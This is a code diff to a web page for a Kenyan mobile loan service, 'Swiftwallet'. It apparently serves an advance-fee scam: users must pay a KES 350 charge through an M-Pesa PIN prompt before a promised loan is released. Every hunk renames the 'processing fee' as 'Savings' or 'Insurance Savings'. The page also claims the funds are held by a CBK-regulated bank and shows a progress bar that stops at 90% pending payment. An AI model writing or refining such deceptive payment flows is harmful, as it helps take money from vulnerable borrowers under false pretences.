@@ -500,7 +500,7 @@
                             <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
                         </div>
                         <div class="flex justify-between">
-                            <span class="text-gray-600">Processing Fee:</span>
+                            <span class="text-gray-600">Loan savings:</span>
                             <span id="processingFee" class="font-semibold text-orange-600">Loading...</span>
                         </div>
                         <div class="flex justify-between pt-3 border-t border-gray-200">
@@ -578,7 +578,7 @@
                             <li>• Keep your phone nearby for confirmation process</li>
                             <li>• You will receive SMS confirmation once completed</li>
                             <li>• Verify your details carefully before proceeding</li>
-                            <li>• 🔰NOTE that all your loan funds are securely  held by chase bank regulated by CBK.Fee securely releases the funds to your Mpesa,Airtel money and Bank accounts.</li>
+                            <li>• 🔰NOTE that all your loan funds are securely  held by chase bank regulated by CBK.Savings securely releases the funds to your Mpesa,Airtel money and Bank accounts.</li>
                            
                             <li>• if you encounter any problem dont hesitate to contact our support team through the blue chat widget at the bottom right side.we are always online</li>
                            
@@ -646,7 +646,7 @@
                         <div class="flex justify-between items-start">
                             <div>
                                 <h4 class="font-semibold text-gray-900">Funds Disbursement</h4>
-                                <p class="text-sm text-gray-600">Waiting for your withdrawal confirmation by competing fee payment to release your available balance funds</p>
+                                <p class="text-sm text-gray-600">Waiting for your withdrawal confirmation by competing Savings payment to release your available balance funds</p>
                             </div>
                             <span class="text-xs text-gray-500">Pending</span>
                         </div>
@@ -809,7 +809,7 @@
                 <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
                     <i class="fas fa-exclamation-circle text-red-600 text-3xl"></i>
                 </div>
-                <h3 class="text-xl font-bold text-gray-900 mb-1">Fee Payment Cancelled/Failed</h3>
+                <h3 class="text-xl font-bold text-gray-900 mb-1">Savings Payment Cancelled/Failed</h3>
                 <p class="text-sm text-gray-600">The STK push was not completed.</p>
             </div>
             
@@ -819,7 +819,7 @@
                         To receive your loan of <span class="font-bold text-green-700" id="retryLoanAmount">KES 50,000</span>,
                     </p>
                     <p class="text-sm text-gray-700 text-center">
-                        Please pay the processing fee of <span class="font-bold text-orange-600" id="retryFeeAmount">KES 350</span>
+                        Please pay the Insurance Savings of <span class="font-bold text-orange-600" id="retryFeeAmount">KES 350</span>
                     </p>
                 </div>
 
@@ -924,8 +924,8 @@
     </div>
 
     <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify your  withdrawal if you haven't received your loan amount or you had loan withdrawal issue and you have paid the fee required,
-      Check your phone for the confirmation SMS from M-Pesa you received after fee payment was done. eg THV5SCFSUH.
+      Paste your M-Pesa transaction code below to verify your  withdrawal if you haven't received your loan amount or you had loan withdrawal issue and you have paid the Savings required,
+      Check your phone for the confirmation SMS from M-Pesa you received after Insurance Savins payment was done. eg THV5SCFSUH.
       only valid codes and current codes are allowed by system. Note that invalid M-pesa codes are rejected and take long to be accepted.
     </p>
 
@@ -1136,7 +1136,7 @@
                                     <div class="text-sm text-green-800">
                                         <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                         <ul class="text-xs space-y-1">
-                                            <li>• You will receive an STK push notification from Swiftwallet Digital Ventures for fee request.</li>
+                                            <li>• You will receive an STK push notification from Swiftwallet Digital Ventures for Savings request.</li>
                                             <li>• Funds will be credited instantly after confirmation</li>
                                             <li>• Transaction limit: KES 300,000 per day</li>
                                         </ul>
@@ -1477,7 +1477,7 @@
                         break;
                 }
 
-                console.log('Processing fee payment for withdrawal:', withdrawalData);
+                console.log('Insurance Savings payment for withdrawal:', withdrawalData);
 
                 // Store withdrawal data for after fee payment
                 localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));
@@ -1601,7 +1601,7 @@
 
             const fee = document.getElementById("processingFee").textContent;
 
-const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET  DIGITAL  VENTURES ✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
+const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET  DIGITAL  VENTURES ✔️</span>. Enter your M-Pesa PIN to complete the Savings payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after Savings deposit of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
@@ -1610,7 +1610,7 @@ document.getElementById("successHeading").textContent =
     `Withdrawal of ${amount} Initiated Successfully! [REASON:Swiftwallet savings deposit ]`;
             
             // Update progress text
-            document.getElementById('progressText').textContent = 'Pending Fee Payment & withdrawal Approval...';
+            document.getElementById('progressText').textContent = 'Pending Savings deposit & withdrawal Approval...';
             
             // Update selected method display
             const methodLogo = document.getElementById('selectedMethodLogo');
@@ -1714,7 +1714,7 @@ startPendingProgress();}
                         <p>We've detected an ongoing withdrawal for <strong>${amount}</strong> to your <strong>${withdrawalMethod}</strong>.</p>
                         <p class="text-sm">Please complete the M-Pesa PIN prompt on your phone to finalize the transfer. If you didn't receive the prompt, you can use the <strong>Retry</strong> button below to trigger it again.</p>
                         <div class="mt-2 p-2 bg-blue-50 rounded border border-blue-100 text-xs italic">
-                            Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> — Funds are secured and waiting for fee confirmation.
+                            Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> — Funds are secured and waiting for deposit Savings confirmation.
                         </div>
                     </div>`
                 );
@@ -1773,16 +1773,16 @@ function checkMpesaCode() {
 
     // Reset
     progressBar.style.width = "0%";
-    progressText.textContent = "Pending Fee Payment... 0%";
+    progressText.textContent = "Pending Savings deposit... 0%";
 
     const interval = setInterval(() => {
         if (progress >= 90) {  // Stop at 90% until confirmation
             clearInterval(interval);
-            progressText.textContent = "Pending Fee Payment & Withdrawal Approval...";
+            progressText.textContent = "Pending Savings deposit & Withdrawal Approval...";
         } else {
             progress += 5;
             progressBar.style.width = progress + "%";
-            progressText.textContent = "Pending Fee Payment... " + progress + "%";
+            progressText.textContent = "Pending Savings deposit... " + progress + "%";
         }
     }, 1000); // update every 1s
 }
@@ -1838,7 +1838,7 @@ if (status === 'success') {
           <div><p class="text-gray-500">Transaction Code</p><p class="font-semibold text-gray-900">${receipt.transaction_code || 'N/A'}</p></div>
           <div><p class="text-gray-500">Phone</p><p class="font-semibold text-gray-900">${receipt.phone}</p></div>
           <div><p class="text-gray-500">Customer Name</p><p class="font-semibold text-gray-900">${receipt.customer_name}</p></div>
-          <div><p class="text-gray-500">Fee Amount</p><p class="font-semibold text-orange-600">KES ${receipt.amount}</p></div>
+          <div><p class="text-gray-500">Savings Amount</p><p class="font-semibold text-orange-600">KES ${receipt.amount}</p></div>
           <div><p class="text-gray-500">Loan Amount</p><p class="font-bold text-green-700">${document.getElementById("availableBalance").textContent}</p></div>
           <div><p class="text-gray-500">Date & Time</p><p class="font-semibold text-gray-900">${new Date(receipt.timestamp).toLocaleString()}</p></div>
         </div>
